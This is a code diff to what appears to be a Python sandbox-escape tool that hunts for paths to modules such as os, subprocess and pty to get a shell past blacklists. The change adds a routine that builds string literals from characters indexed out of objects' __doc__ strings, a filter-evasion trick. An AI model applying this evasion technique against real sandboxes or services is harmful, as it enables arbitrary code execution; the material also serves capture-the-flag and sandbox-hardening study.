@@ -73,7 +73,8 @@ def bypassMAIN(local_scope: Dict[str, Any] = {},
     :param log_level: is the logging level, default is INFO, change it to
     DEBUG for more details.
     '''
-    global achivements, log_level_, generated_path, search_depth, tagged_scope, try_to_restore, reminder
+    global achivements, log_level_, generated_path, search_depth, tagged_scope, try_to_restore, reminder, string_dict
+    string_dict = {} # The dictionary of string literals found in the scope (e.g. {'b': bytes.__doc__[0]})
     useful_modules = ['os', 'subprocess', 'uuid', 'pydoc', '_posixsubprocess',
         'multiprocessing', 'builtins', 'codecs', 'warnings', 'base64',
         'importlib', 'weakref', 'reprlib', 'sys', 'linecache', 'pty']
@@ -183,6 +184,18 @@ Try to bypass blacklist with them. Please be paitent.', len(path), data_name)
     tags = [i[1] for i in tagged_scope.values()]
     searched_modules = {item: [] for item in useful_modules
                         if item not in get_module_from_tagged_scope(tagged_scope)}
+    obj_list = [i for i in tagged_scope]
+    obj_list.sort(key=len)
+    for i in obj_list:
+        obj = tagged_scope[i][0]
+        doc = getattr(obj, '__doc__', None)
+        if doc:
+            for index, j in enumerate(doc):
+                if j not in string_dict:
+                    payload = i+'.__doc__['+str(index)+']'
+                    string_dict[j] = payload
+                    reminder[payload] = f'index {index} of {payload} must match the string literal {j}.'
+    logger.debug('[*] string literals found: %s', string_dict)
 
     # Step2: Try to exec directly with simple paths
     simple_path = filter_path_list(RCE_data['directly_getshell'], tagged_scope) if interactive else []
@@ -341,7 +354,7 @@ Try to bypass blacklist with them. Please be paitent.', len(builtin_path))
                                 original_scope.pop('__return__', None)
                                 if not result is None:
                                     searched_modules_tmp[j].append(_)
-                                    reminder[_] = f'{index} is the index of {i.__name__}, path to {j} must fit in index of {i.__name__}'
+                                    reminder[_] = f'{index} is the index of {i.__name__}, path to {j} must fit in index of {i.__name__}.'
                             continue
             except AttributeError:
                 pass
